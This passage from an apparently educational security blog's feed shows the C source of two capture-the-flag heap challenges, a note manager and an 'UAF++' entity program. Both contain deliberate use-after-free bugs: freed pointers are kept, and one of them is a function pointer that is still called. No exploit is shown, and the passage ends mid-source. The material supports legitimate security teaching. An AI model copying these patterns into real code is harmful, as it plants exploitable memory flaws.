&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">note&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>content;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">note&lt;/span> notes[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">read_int&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x1f&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> atoi(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">read_ul&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x1f&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> strtoul(buf, NULL, &lt;span style="color:#ae81ff">10&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">get_idx&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (idx &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span> &lt;span style="color:#f92672">||&lt;/span> idx &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">add_note&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Length: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	notes[idx].len &lt;span style="color:#f92672">=&lt;/span> read_ul();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	notes[idx].content &lt;span style="color:#f92672">=&lt;/span> malloc(notes[idx].len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Add done&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">read_note&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Note[%d]:&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, idx);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	write(&lt;span style="color:#ae81ff">1&lt;/span>, notes[idx].content, notes[idx].len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">write_note&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Content: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, notes[idx].content, notes[idx].len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">delete_note&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	free(notes[idx].content);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Delete done&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">memu&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;1. add note&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;2. read note&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;3. write note&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;4. delete note&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;choice: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;./flag.txt&amp;#34;&lt;/span>, O_RDONLY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	notes[&lt;span style="color:#ae81ff">0&lt;/span>].len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x30&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	notes[&lt;span style="color:#ae81ff">0&lt;/span>].content &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x30&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(fd, notes[&lt;span style="color:#ae81ff">0&lt;/span>].content, &lt;span style="color:#ae81ff">0x30&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	close(fd);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (;;)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		memu();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">int&lt;/span> choice &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">switch&lt;/span> (choice)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			add_note();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			read_note();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			write_note();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			delete_note();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			puts(&lt;span style="color:#e6db74">&amp;#34;Invalid command&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x40(2023 HW - UAF++)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/</guid><description>&lt;h1 id="simple-pwn-0x402023-hw---uaf">
 Simple PWN 0x40(2023 HW - UAF++)
 &lt;a class="anchor" href="#simple-pwn-0x402023-hw---uaf">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/SJWc9v4Bp">0x34(2023 Lab - UAF):three:&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">default_handle&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>event)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;EVENT: get event named &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, event);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>name;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>event;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>event_handle)(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span> &lt;span style="color:#f92672">*&lt;/span>entities[&lt;span style="color:#ae81ff">0x2&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">read_int&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x1f&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> atoi(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">get_idx&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (idx &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x2&lt;/span> &lt;span style="color:#f92672">||&lt;/span> idx &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">memu&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;1. register entity&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;2. delete entity&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;3. trigger event&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;choice: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">register_entity&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx] &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Default Event&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event_handle &lt;span style="color:#f92672">=&lt;/span> default_handle;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Nmae Length: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	len &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (len &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> len &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x430&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name &lt;span style="color:#f92672">=&lt;/span> malloc(len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Name: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name, len &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">delete_entity&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(entities[idx]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Invalid index&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">trigger_event&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;Name: %s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event_handle(entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
